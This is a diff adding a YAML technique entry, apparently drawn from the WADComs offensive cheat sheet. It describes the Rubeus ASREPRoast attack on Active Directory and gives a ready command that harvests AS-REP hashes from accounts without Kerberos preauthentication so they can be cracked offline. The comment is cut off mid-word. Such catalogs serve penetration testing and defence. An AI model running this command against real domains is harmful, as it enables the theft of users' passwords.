@@ -1,0 +1,31 @@
+id: wadcoms/rubeus-asreproast
+type: technique
+platform: active-directory
+name: Rubeus ASREPRoast
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+- privilege-escalation
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- shell
+commands:
+- template: Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+  comment: Rubeus' `asreproast` module will attempt to harvest the non-preauth AS_REP responses for a
+    given list of usernames. These responses will be encrypted with the user's password, which can then
+    be cracked offline. The following command is run on a Windows machine in the victim domai
+references:
+- https://github.com/GhostPack/Rubeus
+- https://github.com/GhostPack/Rubeus#asreproast
+tags:
+- active-directory
+- wadcoms
+- kerberos
